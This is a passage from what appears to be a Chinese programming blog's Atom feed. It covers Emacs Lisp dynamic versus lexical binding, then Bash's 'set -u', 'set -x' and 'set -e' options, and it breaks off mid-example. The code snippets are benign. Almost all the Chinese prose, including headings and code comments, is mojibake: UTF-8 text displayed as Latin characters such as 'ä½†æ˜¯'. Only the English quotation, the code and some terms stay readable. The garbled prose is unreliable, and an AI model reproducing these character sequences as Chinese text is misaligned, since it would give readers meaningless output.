&lt;p>ä½†æ˜¯åœ¨ä¸€äº›å¤æ‚æƒ…å†µä¸‹ï¼Œæƒ…å†µåˆ™æœ‰æ‰€ä¸åŒã€‚ä¾‹å¦‚ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-emacs-lisp" data-lang="emacs-lisp">&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">let&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">a&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="c1">; binding (1)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">let&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">f&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">lambda&lt;/span> &lt;span class="p">()&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">print&lt;/span> &lt;span class="nv">a&lt;/span>&lt;span class="p">))))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">let&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">a&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="c1">; binding (2)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">funcall&lt;/span> &lt;span class="nv">f&lt;/span>&lt;span class="p">))))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;; dynamic binding ==&amp;gt; 2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;; lexical binding ==&amp;gt; 1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>
&lt;p>å¦‚æœæ˜¯ &lt;strong>lexical binding&lt;/strong> ï¼Œåœ¨è®¿é—®å˜é‡æ—¶ï¼Œä¼šåœ¨ &lt;strong>lexical enviroment&lt;/strong> ä¸­æŸ¥æ‰¾ç»‘å®šï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨å˜é‡çš„ä»£ç å—èŒƒå›´å†…æŸ¥æ‰¾ã€‚å½“åœ¨ &lt;strong>lexical enviroment&lt;/strong> ä¸­æœ‰å¤šä¸ªç»‘å®šåŒæ—¶å­˜åœ¨æ—¶ï¼Œé€‰æ‹©æœ€å†…å±‚çš„é‚£ä¸ªã€‚&lt;/p>
&lt;p>å› æ­¤ï¼Œå¦‚æœæ˜¯ lexical bindingï¼Œä¸Šè¿°ä»£ç ä¼šæ‰“å° â€œ1â€ï¼Œå› ä¸ºåªæœ‰ binding (1) åœ¨
lexical enviroment ä¸­ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¦‚æœæ˜¯ &lt;strong>dynamic binding&lt;/strong>, åœ¨è®¿é—®å˜é‡æ—¶åªä¼šåœ¨ &lt;strong>dynamic enviroment&lt;/strong> ä¸­æŸ¥æ‰¾ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æ‰€æœ‰çš„ç»‘å®šä¸­æŸ¥æ‰¾ï¼ŒåŒ…æ‹¬ä»ç¨‹åºå¯åŠ¨ä¹‹ååˆ›å»ºçš„æ‰€æœ‰ç»‘å®šï¼ˆåªè¦æ²¡è¢«é”€æ¯ï¼‰ã€‚å¦‚æœåŒæ—¶å­˜åœ¨å¤šä¸ªç»‘å®šï¼Œåˆ™ä½¿ç”¨è¿è¡Œæ—¶æœ€è¿‘åˆ›å»ºçš„é‚£ä¸ªï¼ˆæˆ‘æƒ³è¿™å°±æ˜¯ &lt;strong>dynamic&lt;/strong> ä¸€è¯çš„ç”±æ¥ï¼‰ã€‚&lt;/p>
&lt;p>å› æ­¤ï¼Œå¦‚æœæ˜¯ dynamic bindingï¼Œä¸Šè¿°ä»£ç ä¼šæ‰“å° â€œ2â€ï¼Œå› ä¸ºå½“ &lt;code>a&lt;/code> æ±‚å€¼æ—¶ï¼Œbinding
(1) å’Œ binding (2) éƒ½è¢«åˆ›å»ºäº†ï¼Œä½†æ˜¯ binding (2) æ‰æ˜¯æœ€è¿‘åˆ›å»ºçš„ã€‚&lt;/p>
&lt;blockquote>
&lt;p>åœ¨å¤šçº¿ç¨‹ Lisp ä¸­ï¼Œå…³äº dynamic binding æˆ‘ä»¬éœ€è¦æ›´åŠ å°å¿ƒä¸€ç‚¹ï¼Œå› ä¸ºè¦ç¡®ä¿ä¸€ä¸ªçº¿ç¨‹ä¸ä¼šçœ‹åˆ°ï¼ˆè®¿é—®åˆ°ï¼‰å¦ä¸€ä¸ªçº¿ç¨‹æ‰€åˆ›å»ºçš„ bindingsã€‚ç”±äº EmacsLisp æ˜¯å•çº¿ç¨‹çš„ï¼Œæ‰€ä»¥ä¸ç”¨æ‹…å¿ƒã€‚&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h2 id="åŠ¨æ€ç»‘å®šçš„ä¼˜ç‚¹">åŠ¨æ€ç»‘å®šçš„ä¼˜ç‚¹&lt;/h2>
&lt;p>åŠ¨æ€ç»‘å®šå¯ä»¥å¾ˆæ–¹ä¾¿çš„ä¿®æ”¹å­ç³»ç»Ÿçš„è¡Œä¸ºã€‚&lt;/p>
&lt;p>è¿™é‡Œä¸¾ä¸€ä¸ªä¾‹å­ã€‚å‡è®¾ä½ æœ‰ä¸€ä¸ª &lt;code>foo&lt;/code> çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šåˆ©ç”¨ &lt;code>print&lt;/code> äº§ç”Ÿä¸€äº›è¾“å‡ºï¼Œä½ å¸Œæœ›å¯ä»¥å°†è¯¥è¾“å‡ºæ•è·åˆ°ä¸€ä¸ª buffer ä¸­ã€‚é€šè¿‡ dynamic bindingï¼Œå¯ä»¥å¾ˆè½»æ¾çš„å®ç°ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-emacs-lisp" data-lang="emacs-lisp">&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;; get-buffer-create è·å–æˆ–åˆ›å»ºä¸€ä¸ªæŒ‡å®šåå­—çš„ bufferï¼Œæ³¨æ„åå­—å‰é¢æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œè¡¨&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;; ç¤ºè¯¥ buffer ä¸ä¿ç•™ undo å†å²&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">let&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">b&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">get-buffer-create&lt;/span> &lt;span class="s">&amp;#34; *string-output*&amp;#34;&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;; ä¿®æ”¹ standard-output å˜é‡ï¼Œå°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ° buffer b ä¸­ã€‚æ³¨æ„ï¼šè¯¥ä¿®æ”¹ä»…åœ¨&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;; è¯¥ let çš„ä½œç”¨åŸŸèŒƒå›´å†…ç”Ÿæ•ˆ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">let&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">standard-output&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;; è¯¥è¾“å‡ºä¼šé‡å®šå‘åˆ° buffer b ä¸­&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">print&lt;/span> &lt;span class="s">&amp;#34;foo&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;; åˆ‡æ¢å½“å‰ buffer ä¸º bï¼Œä»…ç”¨äºç¼–è¾‘ï¼Œä¸ä¼šå±•ç¤ºè¯¥ buffer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">set-buffer&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">insert&lt;/span> &lt;span class="s">&amp;#34;bar&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;; è¿”å›å½“å‰ buffer çš„å†…å®¹&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">buffer-string&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;p>å¦‚æœä½ ç»å¸¸ä½¿ç”¨ç±»ä¼¼çš„åŠŸèƒ½ï¼Œä½ åº”è¯¥å°†å…¶å°è£…åœ¨ä¸€ä¸ª macro ä¸­ â€”â€” å¹¸è¿çš„æ˜¯ï¼Œå·²ç»æœ‰è¿™æ ·çš„å°è£…äº†ï¼š &lt;code>with-output-to-temp-buffer&lt;/code> ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>ç”±äº &lt;code>foo&lt;/code> ï¼ˆè¿™é‡Œå…¶å®æ˜¯ &lt;code>print&lt;/code> å‡½æ•°ï¼‰ä½¿ç”¨çš„ &lt;code>standard-output&lt;/code> æ˜¯ &lt;em>dynamic binding&lt;/em> çš„ï¼Œå› æ­¤ä½ å¯ä»¥æ›¿æ¢æˆä½ è‡ªå·±çš„ç»‘å®šï¼Œä»¥æ­¤æ¥ä¿®æ”¹ &lt;code>foo&lt;/code> çš„è¡Œä¸º â€”â€” ä»¥åŠ &lt;code>foo&lt;/code> æ‰€è°ƒç”¨çš„æ‰€æœ‰
functions çš„è¡Œä¸ºã€‚&lt;/p>
&lt;p>åœ¨ä¸€ä¸ªä¸æ”¯æŒ dynamic binding çš„è¯­è¨€ä¸­ï¼Œä½ å¤§æ¦‚éœ€è¦ç»™ &lt;code>foo&lt;/code> å¢åŠ ä¸€ä¸ªå¯é€‰å‚æ•°æ¥æŒ‡å®šä¸€ä¸ª bufferï¼Œç„¶å &lt;code>foo&lt;/code> éœ€è¦ä¼ é€’è¯¥å‚æ•°ç»™æ‰€æœ‰çš„ &lt;code>print&lt;/code> è°ƒç”¨ã€‚å¦‚æœ &lt;code>foo&lt;/code> è¿˜è°ƒç”¨äº†å…¶ä»–å‡½æ•°ï¼Œå¹¶ä¸”è¿™äº›å‡½æ•°ä¹Ÿè°ƒç”¨äº† &lt;code>print&lt;/code> ï¼Œé‚£ä¹ˆä½ åŒæ ·éœ€è¦ä¿®æ”¹æ‰€æœ‰è¿™äº›å‚æ•°ï¼ˆæ³¨æ„ï¼šè¿™æ˜¯ä¸€ä¸ªé€’å½’çš„è¿‡ç¨‹ï¼‰ã€‚&lt;/p>
&lt;p>Richard Stallman åœ¨ EmacsLisp çš„ä¸Šä¸‹æ–‡ä¸­è§£é‡Šäº†åŠ¨æ€ç»‘å®šçš„ä¼˜ç‚¹ï¼š&lt;a href="https://www.gnu.org/software/emacs/emacs-paper.html#SEC17">Emacs Paper - Dynamic
Binding&lt;/a> ã€‚å¦è¯·å‚é˜… Pascal Costanza å†™çš„æ–‡ç«  &lt;a href="http://www.p-cos.net/documents/dynatype.pdf">Dynamic vs. Static Typing â€” A
Pattern-Based Analysis&lt;/a> ã€‚&lt;/p>
&lt;h2 id="è¯æ³•ç»‘å®šçš„ä¼˜ç‚¹">è¯æ³•ç»‘å®šçš„ä¼˜ç‚¹&lt;/h2>
&lt;p>MilesBader çš„è¿™å°é‚®ä»¶è®²çš„å¾ˆæ¸…æ¥šï¼Œè¿™é‡Œæ‘˜æŠ„å¹¶ç¿»è¯‘å¦‚ä¸‹ï¼š&lt;/p>
&lt;blockquote>
&lt;div class="verse">
&lt;p>From: MilesBader&lt;br />
Subject: Re: Emacs 22&lt;br />
Newsgroups: comp.emacs&lt;br />
Date: Sun, 19 Aug 2001 01:47:53 GMT&lt;br />&lt;/p>
&lt;/div>
&lt;p>Because it&amp;rsquo;s (1) much easier for the user [that is, programmer], because it
eliminates the problem of which variables lambda-expressions use (when they
attempt to use variables from their surrounding context), and (2) much easier
for the compiler to optimize, because it doesn&amp;rsquo;t need to worry about variables
escaping their lexical context, and so doesn&amp;rsquo;t need to allow for the possibility
(this is a big problem with the current compiler).&lt;/p>
&lt;p>å› ä¸ºå®ƒï¼ˆ1ï¼‰å¯¹äºç¨‹åºå‘˜æ¥è®²ï¼Œè¦ç®€å•å¾ˆå¤šï¼Œå› ä¸ºå®ƒæ¶ˆé™¤äº† lambda è¡¨è¾¾å¼ä½¿ç”¨å“ªäº›å˜é‡çš„é—®é¢˜ï¼ˆå½“ä»–ä»¬å°è¯•ä½¿ç”¨å¤–å›´ç¯å¢ƒçš„å˜é‡æ—¶ï¼‰ï¼Œï¼ˆ2ï¼‰å¯¹äºç¼–è¯‘å™¨æ¥è¯´ï¼Œä¼˜åŒ–èµ·æ¥è¦ç®€å•å¾ˆå¤šï¼Œå› ä¸ºå®ƒä¸éœ€è¦æ‹…å¿ƒå˜é‡ä»è¯æ³•ä¸Šä¸‹æ–‡ä¸­é€ƒé€¸å‡ºå»ï¼Œå› æ­¤ä¸éœ€è¦è€ƒè™‘è¿™ç§é€ƒé€¸å‡ºå»çš„å¯èƒ½æ€§ï¼ˆè¿™æ˜¯å½“å‰ç¼–è¯‘å™¨çš„ä¸€ä¸ªå¤§é—®é¢˜ï¼‰ã€‚&lt;/p>
&lt;/blockquote>
&lt;h2 id="è¯­è¨€">è¯­è¨€&lt;/h2>
&lt;p>å¤§éƒ¨åˆ†è¯­è¨€åªæ”¯æŒ lexical binding ã€‚&lt;/p>
&lt;ul>
&lt;li>EmacsLisp ä» 24.1 ç‰ˆæœ¬å¼€å§‹åŒæ—¶æ”¯æŒ dynamic binding å’Œ lexical binding ã€‚
Lexical binding éœ€è¦åœ¨ä¸€ä¸ªæ–‡ä»¶æˆ– buffer ä¸­æ˜¾å¼å¯ç”¨ï¼ˆè§ä¸‹æ–‡ï¼‰ã€‚é€šè¿‡ &lt;code>defvar&lt;/code> å®šä¹‰çš„å˜é‡ä¸ºâ€œspecialâ€å˜é‡ï¼Œå³æ°¸è¿œæ˜¯åŠ¨æ€ç»‘å®šçš„ï¼ˆå³ä½¿è¯¥æ–‡ä»¶å¯ç”¨äº† lexical bindingï¼‰ã€‚&lt;/li>
&lt;li>CommonLisp åŒæ—¶æ”¯æŒ dynamic binding å’Œ lexical binding ã€‚ é»˜è®¤ä¸º lexical
bindingï¼Œé€šè¿‡ &lt;code>defvar&lt;/code> æˆ– &lt;code>declare&lt;/code> åˆ›å»ºçš„ä¸€ä¸ªå˜é‡å³ä¸ºâ€œspecialâ€çš„åŠ¨æ€ç»‘å®šå˜é‡ã€‚&lt;/li>
&lt;/ul>
&lt;h2 id="ä½¿ç”¨è¯æ³•ç»‘å®š">ä½¿ç”¨è¯æ³•ç»‘å®š&lt;/h2>
&lt;p>è¦åœ¨ EmacsLisp ä¸­ä½¿ç”¨è¯æ³•ç»‘å®šï¼Œéœ€è¦åœ¨æ–‡ä»¶å¤´ä¸­è®¾ç½® file-local å˜é‡
&lt;code>lexical-binding&lt;/code> ä¸º &lt;code>t&lt;/code> ï¼Œä¸”å¿…é¡»åœ¨æ–‡ä»¶çš„ç¬¬ä¸€è¡Œä¸­è®¾ç½®ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-emacs-lisp" data-lang="emacs-lisp">&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;;; -*- lexical-binding: t -*-&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></content><category scheme="https://mincodes.com/tags/elisp/" term="Elisp" label="Elisp"/><category scheme="https://mincodes.com/tags/emacs/" term="Emacs" label="Emacs"/></entry><entry><title type="text">Bash: set å‘½ä»¤ç”¨æ³•ä»‹ç»</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/bash-set/"/><id>https://mincodes.com/posts/bash-set/</id><updated>2023-06-26T14:47:47+08:00</updated><published>2023-06-26T12:49:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">Bash åœ¨æ‰§è¡Œè„šæœ¬çš„æ—¶å€™ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ shell, æ¯ä¸ª shell éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„æ‰§è¡Œç¯å¢ƒï¼Œè¿™ä¸ªç¯å¢ƒä¼šæœ‰ä¸€äº›é»˜è®¤è¡Œä¸ºï¼Œè€Œè¿™äº›é»˜â€¦</summary><content type="html">&lt;p>&lt;em>Bash&lt;/em> åœ¨æ‰§è¡Œè„šæœ¬çš„æ—¶å€™ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ &lt;em>shell&lt;/em>, æ¯ä¸ª &lt;em>shell&lt;/em> éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„æ‰§è¡Œç¯å¢ƒï¼Œè¿™ä¸ªç¯å¢ƒä¼šæœ‰ä¸€äº›é»˜è®¤è¡Œä¸ºï¼Œè€Œè¿™äº›é»˜è®¤è¡Œä¸ºå¯ä»¥é€šè¿‡ &lt;code>set&lt;/code> å‘½ä»¤æ¥ä¿®æ”¹ã€‚&lt;/p>
&lt;p>è¿™é‡Œä»‹ç»å‡ ç§å¸¸ç”¨çš„ &lt;code>set&lt;/code> å‘½ä»¤ã€‚&lt;/p>
&lt;blockquote>
&lt;p>æ³¨ï¼š &lt;code>set&lt;/code> å‘½ä»¤åœ¨ä¸å¸¦å‚æ•°æ‰§è¡Œæ—¶ï¼Œä¼šæ˜¾ç¤ºå½“å‰ shell çš„æ‰€æœ‰ç¯å¢ƒå˜é‡ã€å‡½æ•°ã€‚&lt;/p>
&lt;/blockquote>
&lt;h2 id="set-u-é‡åˆ°ä¸å­˜åœ¨çš„å˜é‡æ—¶æŠ¥é”™-å¹¶åœæ­¢æ‰§è¡Œ">&lt;code>set -u&lt;/code> é‡åˆ°ä¸å­˜åœ¨çš„å˜é‡æ—¶æŠ¥é”™ï¼Œå¹¶åœæ­¢æ‰§è¡Œ&lt;/h2>
&lt;p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ &lt;em>bash&lt;/em> é‡åˆ°ä¸å­˜åœ¨çš„å˜é‡æ—¶ä¼šå¿½ç•¥ã€‚ä¸ºäº†è®©è„šæœ¬æ›´åŠ ä¸¥è°¨å’Œå®‰å…¨ï¼ŒæŠ¥é”™å¹¶åœæ­¢æ‰§è¡Œæ˜¯ä¸€ç§æ›´å¥½çš„é€‰æ‹©ã€‚&lt;/p>
&lt;p>&lt;a id="code-snippet--set-u">&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> -u
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$non_exist_var&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Output:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">bash: line 4: non_exist_var: unbound variable
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="set-x-è¿è¡Œå‘½ä»¤ä¹‹å‰-å…ˆæ‰“å°å‘½ä»¤æœ¬èº«">&lt;code>set -x&lt;/code> è¿è¡Œå‘½ä»¤ä¹‹å‰ï¼Œå…ˆæ‰“å°å‘½ä»¤æœ¬èº«&lt;/h2>
&lt;p>&lt;a id="code-snippet--set-x">&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> -x
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">unameOutput&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="k">$(&lt;/span>uname -s&lt;span class="k">)&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$unameOutput&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Output:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">++ uname -s
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ unameOutput=Darwin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ echo Darwin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Darwin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="set-e-å‘ç”Ÿé”™è¯¯æ—¶åŠæ—¶ç»ˆæ­¢è„šæœ¬">&lt;code>set -e&lt;/code> å‘ç”Ÿé”™è¯¯æ—¶åŠæ—¶ç»ˆæ­¢è„šæœ¬&lt;/h2>
&lt;p>é»˜è®¤æƒ…å†µä¸‹ï¼Œè„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­å¦‚æœå‡ºç°è¿è¡Œå¤±è´¥çš„å‘½ä»¤ï¼Œ &lt;em>Bash&lt;/em> ä¼šç»§ç»­æ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œè€Œè¿™å¾€å¾€æ˜¯ä¸å¤ªå®‰å…¨çš„è¡Œä¸ºï¼ˆå› ä¸ºåé¢çš„å‘½ä»¤å¾ˆå¯èƒ½ä¾èµ–å‰é¢å‘½ä»¤çš„æˆåŠŸæ‰§è¡Œï¼‰ã€‚&lt;/p>
&lt;p>&lt;a id="code-snippet--set-e1">&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> /non/exist/path
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;do something dangerous like rm files&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Output:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">bash: line 2: cd: /non/exist/path: No such file or directory
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">do something dangerous like rm files
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å®è·µå½“ä¸­ï¼Œä¸ºäº†é¿å…è¯¥é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨é€»è¾‘è¿ç®—ç¬¦çš„çŸ­è·¯è¡Œä¸ºæ¥åŠæ—¶ç»ˆæ­¢å‘½ä»¤çš„æ‰§è¡Œï¼š&lt;/p>
&lt;p>&lt;a id="code-snippet--set-e2">&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> /non/exist/path &lt;span class="o">||&lt;/span> &lt;span class="o">{&lt;/span> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;/non/exist/path is not found&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">exit&lt;/span> 1&lt;span class="p">;&lt;/span> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;do something dangerous like rm files&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Output:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
